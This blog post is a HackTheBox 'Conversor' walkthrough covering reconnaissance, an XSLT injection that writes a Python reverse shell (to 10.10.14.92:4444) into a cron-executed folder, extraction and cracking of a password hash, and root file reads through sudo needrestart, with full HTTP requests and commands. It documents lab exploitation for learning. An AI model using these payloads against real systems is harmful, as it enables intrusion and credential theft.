@@ -1,0 +1,550 @@
+<!doctype html>
+<html lang="en">
+  <head><meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Giuslock Pages</title>
+<meta name="description" content="Giuslock Pages — " />
+<link rel="stylesheet" href="/_assets/css/chirpy.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
+<script defer src="/_assets/js/main.js"></script>
+<link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="wrapper">
+      <aside class="sidebar" role="navigation">
+  <div class="sidebar-profile">
+    <a href="/about">
+      <img
+        src="/_assets/img/profile.png"
+        alt="Profile picture"
+        class="profile-img"
+        width="100"
+        height="100"
+      >
+    </a>
+    <h2 class="brand">
+      <a href="/">Giuslock Pages</a>
+    </h2>
+    <span class="sub"></span>
+  </div>
+
+  <nav class="nav">
+    <a href="/">Home</a>
+    <a href="/archives">Archives</a>
+    <a href="/tags">Tags</a>
+    <a href="/about">About</a>
+    
+      <a href="/rss.xml">RSS</a>
+    
+    <a href="/search">Search</a>
+  </nav>
+</aside>
+
+      <div class="content">
+        <div class="container">
+          <header class="header">
+  <div class="search">
+    <form action="/search">
+      <input type="search" name="q" placeholder="Search…" />
+    </form>
+  </div>
+</header>
+
+          <div class="card"><div class="post"><div class="article-grid">
+  <div>
+    <div class="breadcrumbs">
+      <a href="/">Home</a>
+      <span class="sep">›</span>
+      <a href="/archives">Archives</a>
+      
+    </div>
+    <h1>Conversor HTB - Complete Walkthrough</h1>
+    <div class="post-meta meta-line">
+      <span class="badge"><span class="dot"></span><time datetime="2026-01-20T17:23:26.763Z">2026-01-20</time></span>
+      
+      <span class="badge"><span class="dot"></span>7 min read</span>
+      
+      
+    </div>
+    <div class="post-content"><p><img src="/_resources/20a6c430d632426e8f16536fee5bf6f0.png" /></p>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>This write-up documents the complete exploitation chain for the "Conversor" machine on HackTheBox. The attack path leverages an XSLT injection vulnerability in a web application that processes Nmap XML files, combined with a cron job that executes Python scripts. The privilege escalation exploits a sudo misconfiguration allowing the execution of <code>needrestart</code> with elevated privileges, which can be abused to read arbitrary files as root.</p>
+<p><strong>Attack Chain Overview:</strong></p>
+<ol>
+<li>Initial reconnaissance via Nmap</li>
+<li>Web application enumeration and source code analysis</li>
+<li>XSLT injection leading to arbitrary file write</li>
+<li>Reverse shell execution via cron job</li>
+<li>Database credential extraction</li>
+<li>SSH access with recovered credentials</li>
+<li>Privilege escalation via needrestart arbitrary file read</li>
+</ol>
+<hr />
+<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>The initial reconnaissance phase began with a comprehensive Nmap scan to identify open ports and running services:</p>
+<div><pre class="hljs"><code>nmap -sCV -T4 -p- -oA nmap-full 10.129.5.4</code></pre></div>
+<p><strong>Scan Results:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-comment"># Nmap 7.98 scan initiated Mon Jan 19 22:36:26 2026</span>
+Nmap scan report <span class="hljs-keyword">for</span> conversor.htb (<span class="hljs-number">10.129</span>.<span class="hljs-number">5.4</span>)
+Host is up (<span class="hljs-number">0.033</span>s latency).
+Not <span class="hljs-symbol">shown:</span> <span class="hljs-number">65533</span> closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp  open  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">13</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-symbol">hostkey:</span>
+|   <span class="hljs-number">256</span> <span class="hljs-number">01</span><span class="hljs-symbol">:</span><span class="hljs-number">74</span><span class="hljs-symbol">:</span><span class="hljs-number">26</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">47</span><span class="hljs-symbol">:bc</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">a:</span><span class="hljs-symbol">e2:</span><span class="hljs-symbol">cb:</span><span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">b:</span><span class="hljs-number">71</span><span class="hljs-symbol">:</span><span class="hljs-number">84</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">c:</span><span class="hljs-symbol">f8:</span><span class="hljs-number">5</span>a (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">3</span><span class="hljs-symbol">a:</span><span class="hljs-number">16</span><span class="hljs-symbol">:</span><span class="hljs-number">90</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:</span><span class="hljs-number">74</span><span class="hljs-symbol">:d8</span><span class="hljs-symbol">:e3</span><span class="hljs-symbol">:c4</span><span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span><span class="hljs-symbol">:e2</span><span class="hljs-symbol">:</span><span class="hljs-number">08</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">26</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span><span class="hljs-symbol">:ee</span> (ED25519)
+<span class="hljs-number">80</span>/tcp  open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">52</span>
+|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> (Ubuntu)
+| http-<span class="hljs-symbol">title:</span> Login
+|_Requested resource was /login
+Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel</code></pre></div>
+<p><strong>Key Findings:</strong></p>
+<ul>
+<li><strong>Port 22 (SSH)</strong>: OpenSSH 8.9p1 - standard Ubuntu configuration</li>
+<li><strong>Port 80 (HTTP)</strong>: Apache 2.4.52 hosting a web application with a login redirect</li>
+</ul>
+<p>The limited attack surface suggests focusing efforts on the web application for initial foothold.</p>
+<hr />
+<h2 id="web-application-analysis">Web Application Analysis</h2>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>Using ffuf for directory discovery with the SecLists wordlist:</p>
+<div><pre class="hljs"><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt:FUZZ \
+     -u http://conversor.htb/FUZZ \
+     -o ./Evidence/Scans/WebScan/directories_unlogged.txt</code></pre></div>
+<p><strong>Discovered Endpoints:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th>Status</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/about</code></td>
+<td>200</td>
+<td>Information page with source code download</td>
+</tr>
+<tr>
+<td><code>/convert</code></td>
+<td>405</td>
+<td>POST-only endpoint for file conversion</td>
+</tr>
+<tr>
+<td><code>/javascript</code></td>
+<td>301</td>
+<td>Static resources directory</td>
+</tr>
+<tr>
+<td><code>/login</code></td>
+<td>200</td>
+<td>Authentication page</td>
+</tr>
+<tr>
+<td><code>/logout</code></td>
+<td>302</td>
+<td>Session termination endpoint</td>
+</tr>
+<tr>
+<td><code>/register</code></td>
+<td>200</td>
+<td>User registration page</td>
+</tr>
+<tr>
+<td><code>/server-status</code></td>
+<td>403</td>
+<td>Apache status page (forbidden)</td>
+</tr>
+</tbody>
+</table>
+<p><img src="/_resources/bb2a3b56282349668c79fa9890a560ca.png" /></p>
+<h3 id="application-functionality">Application Functionality</h3>
+<p>After registering an account and authenticating, the core functionality became apparent:</p>
+<p><strong>Conversor Application Purpose:</strong><br />
+The application provides a service to convert Nmap XML scan files into HTML format using XSLT (Extensible Stylesheet Language Transformations) for customization. Users can upload:</p>
+<ol>
+<li>An XML file (Nmap scan output)</li>
+<li>An XSLT file (transformation stylesheet)</li>
+</ol>
+<p>The application then processes these files and returns an HTML report.</p>
+<p><img src="/_resources/4978fde0f7bc41289226d9e1db050b04.png" /></p>
+<hr />
+<h2 id="source-code-analysis">Source Code Analysis</h2>
+<h3 id="accessing-the-source-code">Accessing the Source Code</h3>
+<p>The <code>/about</code> page revealed a critical information disclosure - a "Download Source Code" button that provided complete access to the application's backend implementation.</p>
+<p><img src="/_resources/570257603c2e487ca501c9741b3f3853.png" /></p>
+<h3 id="critical-vulnerability-discovery">Critical Vulnerability Discovery</h3>
+<h4 id="cron-job-configuration">Cron Job Configuration</h4>
+<p>Examining the source code revealed a cron job configured to execute Python scripts at regular intervals:</p>
+<div><pre class="hljs"><code>* * * * * www-data <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> /var/www/conversor.htb/scripts/*.py; <span class="hljs-keyword">do</span> python3 <span class="hljs-string">"<span class="hljs-variable">$f</span>"</span>; <span class="hljs-keyword">done</span></code></pre></div>
+<p><strong>Exploitation Implications:</strong></p>
+<ul>
+<li>Runs every minute as the <code>www-data</code> user</li>
+<li>Executes <strong>all</strong> Python files in <code>/var/www/conversor.htb/scripts/</code></li>
+<li>Provides a potential code execution vector if we can write to this directory</li>
+</ul>
+<h4 id="xslt-injection-vulnerability">XSLT Injection Vulnerability</h4>
+<p>The vulnerable code in <code>app.py</code>:</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>():
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'user_id'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))
+    
+    xml_file = request.files[<span class="hljs-string">'xml_file'</span>]
+    xslt_file = request.files[<span class="hljs-string">'xslt_file'</span>]
+    
+    <span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree
+    
+    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
+    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
+    
+    xml_file.save(xml_path)
+    xslt_file.save(xslt_path)
+    
+    <span class="hljs-keyword">try</span>:
+        parser = etree.XMLParser(
+            resolve_entities=<span class="hljs-literal">False</span>, 
+            no_network=<span class="hljs-literal">True</span>,
+            dtd_validation=<span class="hljs-literal">False</span>, 
+            load_dtd=<span class="hljs-literal">False</span>
+        )
+        xml_tree = etree.parse(xml_path, parser)
+        xslt_tree = etree.parse(xslt_path)
+        transform = etree.XSLT(xslt_tree)
+        result_tree = transform(xml_tree)
+        result_html = <span class="hljs-built_in">str</span>(result_tree)
+        
+        file_id = <span class="hljs-built_in">str</span>(uuid.uuid4())
+        filename = <span class="hljs-string">f"<span class="hljs-subst">{file_id}</span>.html"</span>
+        html_path = os.path.join(UPLOAD_FOLDER, filename)
+        
+        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(html_path, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
+            f.write(result_html)
+        
+        conn = get_db()
+        conn.execute(
+            <span class="hljs-string">"INSERT INTO files (id,user_id,filename) VALUES (?,?,?)"</span>,
+            (file_id, session[<span class="hljs-string">'user_id'</span>], filename)
+        )
+        conn.commit()
+        conn.close()
+        
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'index'</span>))
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f"Error: <span class="hljs-subst">{e}</span>"</span></code></pre></div>
+<p><strong>Vulnerability Analysis:</strong></p>
+<p>While the XML parser has protections against XXE (XML External Entity) attacks through disabled entity resolution, the XSLT processing lacks critical security controls:</p>
+<ol>
+<li><strong>No XSLT sanitization</strong> - User-supplied XSLT is parsed and executed without validation</li>
+<li><strong>Full XSLT 1.0 capabilities</strong> - The <code>lxml</code> library supports powerful XSLT features including file operations</li>
+<li><strong>Error disclosure</strong> - Exceptions are returned to the user, aiding exploitation</li>
+</ol>
+<p><strong>XSLT Security Context:</strong></p>
+<p>XSLT is a Turing-complete language with extensive capabilities beyond simple transformations. The EXSLT extensions (supported by <code>lxml</code>) provide file system operations through the <code>exsl:document</code> element, allowing arbitrary file writes with the privileges of the web server process.</p>
+<hr />
+<h2 id="exploitation-xslt-injection-to-rce">Exploitation: XSLT Injection to RCE</h2>
+<h3 id="phase-1-information-gathering">Phase 1: Information Gathering</h3>
+<p>First, I verified the XSLT processor version and capabilities:</p>
+<p><strong>Request:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/convert</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>conversor.htb
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----geckoformboundary85e66f7c5762e676e50a46a257316b27
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=eyJ1c2VyX2lkIjozNjYsInVzZXJuYW1lIjoiQSJ9.aW6qhw.rE98TRqsZiID9FD4fdzwtegRsGU
+
+<span class="language-xml">------geckoformboundary85e66f7c5762e676e50a46a257316b27
+Content-Disposition: form-data; name="xml_file"; filename="test.xml"
+Content-Type: text/xml
+
+<span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+
+------geckoformboundary85e66f7c5762e676e50a46a257316b27
+Content-Disposition: form-data; name="xslt_file"; filename="probe.xslt"
+Content-Type: application/octet-stream
+
+<span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xsl:version</span>=<span class="hljs-string">"1.0"</span> 
+      <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">"http://www.w3.org/1999/XSL/Transform"</span>
+      <span class="hljs-attr">xmlns:php</span>=<span class="hljs-string">"http://php.net/xsl"</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Version: <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"system-property('xsl:version')"</span> /&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Vendor: <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"system-property('xsl:vendor')"</span> /&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Vendor URL: <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"system-property('xsl:vendor-url')"</span> /&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+
+------geckoformboundary85e66f7c5762e676e50a46a257316b27--</span></code></pre></div>
+<p><strong>Response:</strong><br />
+<img src="/_resources/47a9e4e3cd864c49922189cb401350fc.png" /></p>
+<div><pre class="hljs"><code>Version: <span class="hljs-number">1.0</span>
+Vendor: libxslt
+Vendor URL: http:<span class="hljs-regexp">//</span>xmlsoft.org<span class="hljs-regexp">/XSLT/</span></code></pre></div>
+<p>This confirmed the use of <code>libxslt</code>, which supports EXSLT extensions including the critical <code>exsl:document</code> function for file writes.</p>
+<h3 id="phase-2-weaponizing-xslt-for-file-write">Phase 2: Weaponizing XSLT for File Write</h3>
+<p>The exploitation strategy:</p>
+<ol>
+<li>Use <code>exsl:document</code> to write a Python reverse shell to <code>/var/www/conversor.htb/scripts/</code></li>
+<li>Wait for the cron job to execute our malicious script</li>
+<li>Catch the reverse shell connection</li>
+</ol>
+<p><strong>Malicious XSLT Payload:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span>
+    <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">"http://www.w3.org/1999/XSL/Transform"</span>
+    <span class="hljs-attr">xmlns:exsl</span>=<span class="hljs-string">"http://exslt.org/common"</span>
+    <span class="hljs-attr">extension-element-prefixes</span>=<span class="hljs-string">"exsl"</span>&gt;</span>
+    
+    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">"/"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">exsl:document</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/var/www/conversor.htb/scripts/evil.py"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"text"</span>&gt;</span>
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.92",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])
+        <span class="hljs-tag">&lt;/<span class="hljs-name">exsl:document</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>File write attempted!<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span></code></pre></div>
+<p><strong>Exploitation Technique Breakdown:</strong></p>
+<ul>
+<li><strong><code>exsl:document</code></strong>: EXSLT function that writes content to a specified file path</li>
+<li><strong><code>href</code> attribute</strong>: Target file path (writable by www-data)</li>
+<li><strong><code>method="text"</code></strong>: Ensures raw text output without XML formatting</li>
+<li><strong>Payload</strong>: Standard Python reverse shell connecting to attacker's listener</li>
+</ul>
+<p><strong>Complete HTTP Request:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/convert</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>conversor.htb
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----geckoformboundary85e66f7c5762e676e50a46a257316b27
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1075
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=eyJ1c2VyX2lkIjozNjYsInVzZXJuYW1lIjoiQSJ9.aW6qhw.rE98TRqsZiID9FD4fdzwtegRsGU
+
+<span class="language-pgsql"><span class="hljs-comment">------geckoformboundary85e66f7c5762e676e50a46a257316b27</span>
+Content-Disposition: form-data; <span class="hljs-type">name</span>="xml_file"; filename="test.xml"
+Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/<span class="hljs-type">xml</span>
+
+&lt;?<span class="hljs-type">xml</span> version="1.0" encoding="UTF-8"?&gt;
+&lt;data&gt;test&lt;/data&gt;
+
+<span class="hljs-comment">------geckoformboundary85e66f7c5762e676e50a46a257316b27</span>
+Content-Disposition: form-data; <span class="hljs-type">name</span>="xslt_file"; filename="evil.xslt"
+Content-<span class="hljs-keyword">Type</span>: application/octet-stream
+
+&lt;?<span class="hljs-type">xml</span> version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:exsl="http://exslt.org/common"
+    <span class="hljs-keyword">extension</span>-element-prefixes="exsl"&gt;
+    
+    &lt;xsl:<span class="hljs-keyword">template</span> match="/"&gt;
+        &lt;exsl:document href="/var/www/conversor.htb/scripts/evil.py" <span class="hljs-keyword">method</span>="text"&gt;
+<span class="hljs-keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.<span class="hljs-keyword">connect</span>(("10.10.14.92",<span class="hljs-number">4444</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);os.dup2(s.fileno(),<span class="hljs-number">2</span>);subprocess.<span class="hljs-keyword">call</span>(["/bin/bash","-i"])
+        &lt;/exsl:document&gt;
+        &lt;result&gt;File <span class="hljs-keyword">write</span> attempted!&lt;/result&gt;
+    &lt;/xsl:<span class="hljs-keyword">template</span>&gt;
+&lt;/xsl:stylesheet&gt;
+
+<span class="hljs-comment">------geckoformboundary85e66f7c5762e676e50a46a257316b27--</span></span></code></pre></div>
+<h3 id="phase-3-catching-the-reverse-shell">Phase 3: Catching the Reverse Shell</h3>
+<p>Setting up the listener:</p>
+<div><pre class="hljs"><code>nc -lvnp 4444</code></pre></div>
+<div><pre class="hljs"><code>listening on [any] 4444 ...
+connect to [10.10.14.92] from (UNKNOWN) [10.129.5.4] 50464
+bash: cannot <span class="hljs-built_in">set</span> terminal process group (19598): Inappropriate ioctl <span class="hljs-keyword">for</span> device
+bash: no job control <span class="hljs-keyword">in</span> this shell
+www-data@conversor:~$</code></pre></div>
+<hr />
+<h2 id="post-exploitation-user-access">Post-Exploitation: User Access</h2>
+<h3 id="database-enumeration">Database Enumeration</h3>
+<p>Exploring the application directory revealed a SQLite database:</p>
+<div><pre class="hljs"><code>www-data@conversor:~$ <span class="hljs-built_in">cd</span> /var/www/conversor.htb
+www-data@conversor:/var/www/conversor.htb$ ls -la
+total 12
+drwxr-xr-x  3 www-data www-data 4096 Aug 15 08:19 .
+drwxr-xr-x 13 root     root     4096 Jul 31 03:55 ..
+-rw-r--r--  1 root     root        0 Jul 31 03:55 __init__.py
+drwxr-xr-x  2 www-data www-data 4096 Aug 15 08:19 instance</code></pre></div>
+<p><img src="/_resources/ca3739cc3cbf47ea8b1f939983f5ca84.png" /></p>
+<div><pre class="hljs"><code>www-data@conversor:~$ sqlite3 /var/www/conversor.htb/instance/users.db
+SQLite version 3.37.2 2022-01-06 13:25:41
+sqlite&gt; .tables
+files
+users
+sqlite&gt; SELECT * FROM users;</code></pre></div>
+<p><strong>Retrieved User Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Username</th>
+<th>Password Hash (MD5)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>fismathack</td>
+<td>5b5c3ac3a1c8****************71fdec</td>
+</tr>
+</tbody>
+</table>
+<h3 id="password-cracking">Password Cracking</h3>
+<p>Analyzing the source code revealed the password hashing scheme:</p>
+<div><pre class="hljs"><code>password = hashlib.md5(request.form[<span class="hljs-string">'password'</span>].encode()).hexdigest()</code></pre></div>
+<p>The application uses unsalted MD5 hashing - a completely broken cryptographic approach vulnerable to rainbow table attacks.</p>
+<p><strong>Cracking with CrackStation:</strong></p>
+<p>Submitting <code>5b5c3ac3a1c8****************71fdec</code> to <a title="https://crackstation.net/" href="https://crackstation.net/">CrackStation</a> immediately revealed:</p>
+<div><pre class="hljs"><code>Plaintext: Keep<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>warm</code></pre></div>
+<h3 id="ssh-authentication">SSH Authentication</h3>
+<div><pre class="hljs"><code>ssh fismathack@conversor.htb
+fismathack@conversor.htb<span class="hljs-string">'s password: Keep************warm</span></code></pre></div>
+<p><strong>User Flag Acquired:</strong></p>
+<div><pre class="hljs"><code>fismathack@conversor:~$ cat user.txt
+[USER_FLAG_HERE]</code></pre></div>
+<hr />
+<h2 id="privilege-escalation-needrestart-arbitrary-file-read">Privilege Escalation: Needrestart Arbitrary File Read</h2>
+<h3 id="sudo-privileges-enumeration">Sudo Privileges Enumeration</h3>
+<div><pre class="hljs"><code>fismathack@conversor:~$ sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> fismathack on conversor:
+    env_reset, mail_badpass, 
+    secure_path=/usr/<span class="hljs-built_in">local</span>/sbin:\usr/<span class="hljs-built_in">local</span>/bin:\usr/sbin:\usr/bin:\sbin:\bin:\snap/bin,
+    use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code></pre></div>
+<p><img src="/_resources/29661e1321e4455e851709f6c9b2bb98.png" /></p>
+<h3 id="needrestart-exploitation">Needrestart Exploitation</h3>
+<p><strong>What is needrestart?</strong></p>
+<p><code>needrestart</code> is a utility that checks which services need restarting after library upgrades. It typically runs automatically after package updates but can also be invoked manually.</p>
+<p><strong>Vulnerability Context:</strong></p>
+<p>The tool accepts a <code>-c</code> flag to specify a custom configuration file. When needrestart attempts to parse this configuration file, it reads the entire contents, and any parsing errors are displayed to the user - including the file contents that caused the error.</p>
+<p><strong>Exploitation Technique:</strong></p>
+<p>By specifying an arbitrary file as the "configuration file", we can force needrestart to read and display its contents through error messages, effectively achieving arbitrary file read with root privileges.</p>
+<p><strong>Root Flag Extraction:</strong></p>
+<div><pre class="hljs"><code>fismathack@conversor:~$ sudo needrestart -c /root/root.txt</code></pre></div>
+<p><img src="/_resources/25d998ee02484b1583583ae486eb4d49.png" /></p>
+<p><strong>Output:</strong></p>
+<div><pre class="hljs"><code>Bareword found where operator expected at (eval 14) line 1, near "8d10dd****************76ff6"
+    (Missing operator before dd****************76ff6?)
+<span class="hljs-keyword">Error </span>parsing /root/root.txt: syntax error at (eval 14) line 2, near "8d10dd****************76ff6"</code></pre></div>
+<p>The root flag is leaked in the error message: <code>8d10dd****************76ff6</code></p>
+<p><strong>Alternative Exploitation Paths:</strong></p>
+<p>This arbitrary file read vulnerability could also be leveraged to:</p>
+<ul>
+<li>Extract <code>/etc/shadow</code> for offline password cracking</li>
+<li>Read SSH private keys from <code>/root/.ssh/id_rsa</code></li>
+<li>Exfiltrate sensitive configuration files</li>
+<li>Read application secrets and database credentials</li>
+</ul>
+<hr />
+<p><strong>Attack Surface Summary:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Vector</th>
+<th>Severity</th>
+<th>Exploitability</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XSLT Injection</td>
+<td>Critical</td>
+<td>High</td>
+<td>RCE as www-data</td>
+</tr>
+<tr>
+<td>Weak Password Hashing</td>
+<td>High</td>
+<td>High</td>
+<td>User compromise</td>
+</tr>
+<tr>
+<td>Sudo Misconfiguration</td>
+<td>High</td>
+<td>Medium</td>
+<td>Root privilege escalation</td>
+</tr>
+</tbody>
+</table>
+<p>This machine serves as an excellent example of how multiple "medium" severity issues can chain together to achieve complete system compromise, reinforcing the importance of comprehensive security practices at every layer.</p>
+</div>
+<nav class="post-nav" style="margin-top:1rem;">
+  
+  
+  
+    <span style="float:right;">
+      <a href="/article/azuresecanalyzer">AzureSecAnalyzer - A PowerShell project that checks the security settings of Azure resources →</a>
+    </span>
+  
+</nav>
+  </div>
+  <aside class="article-aside">
+    <div class="aside-card">
+      <h3>Contents</h3>
+      <ul id="toc-list" class="toc"></ul>
+    </div>
+    <div class="aside-card">
+      <h3>Recently Updated</h3>
+      <ul class="post-list">
+        
+          <li class="post-item" style="border:0;padding:.25rem 0;"><a href="/article/conversor-htb-complete-walkthrough">Conversor HTB - Complete Walkthrough</a></li>
+        
+          <li class="post-item" style="border:0;padding:.25rem 0;"><a href="/article/azuresecanalyzer">AzureSecAnalyzer - A PowerShell project that checks the security settings of Azure resources</a></li>
+        
+          <li class="post-item" style="border:0;padding:.25rem 0;"><a href="/article/untitled">CTF Report: 2Million</a></li>
+        
+          <li class="post-item" style="border:0;padding:.25rem 0;"><a href="/article/smithers-echo-ctf-challenge">Smithers - Echo CTF Challenge</a></li>
+        
+          <li class="post-item" style="border:0;padding:.25rem 0;"><a href="/article/soccer-an-htb-easy-machine">Soccer - An HTB easy machine</a></li>
+        
+      </ul>
+    </div>
+    <div class="aside-card">
+      <h3>Trending Tags</h3>
+      
+      
+        <a href="/tags#topic:ctf" class="tag" style="display:inline-block;margin:.15rem .3rem 0 0;">topic:ctf</a>
+      
+    </div>
+  </aside>
+</div>
+<script>
+(function(){
+  const content=document.querySelector('.post-content');
+  const tocList=document.getElementById('toc-list');
+  if(!content||!tocList) return;
+  const headings=content.querySelectorAll('h2, h3');
+  if(!headings.length){ tocList.innerHTML='<li class="post-item" style="border:0;color:var(--muted)">No headings</li>'; return; }
+  const ids=new Set();
+  const slug=s=>(s||'').toLowerCase().replace(/[^a-z0-9\s-]/g,'').trim().replace(/\s+/g,'-').slice(0,80);
+  headings.forEach(h=>{
+    let id=h.id||slug(h.textContent||'section');
+    while(ids.has(id)) id=id+'-x';
+    ids.add(id); h.id=id;
+    const li=document.createElement('li');
+    li.innerHTML='<a class="toc-'+h.tagName.toLowerCase()+'" href="#'+id+'">'+(h.textContent||'')+'</a>';
+    tocList.appendChild(li);
+  });
+  const links=Array.from(tocList.querySelectorAll('a'));
+  const map=new Map(links.map(a=>[a.getAttribute('href'),document.getElementById(a.getAttribute('href').slice(1))]));
+  const onScroll=()=>{let active=links[0];const fromTop=window.scrollY+90;
+    links.forEach(a=>{const h=map.get(a.getAttribute('href')); if(h&&h.offsetTop<=fromTop) active=a;});
+    links.forEach(a=>a.classList.remove('active')); if(active) active.classList.add('active');
+  };
+  document.addEventListener('scroll', onScroll, {passive:true}); onScroll();
+})();
+</script>
+</div></div>
+        </div>
+      </div>
+    </div>
+    <footer class="site-footer">
+  <div class="container">
+    <p>© 2026 Giuslock.</p>
+  </div>
+</footer>
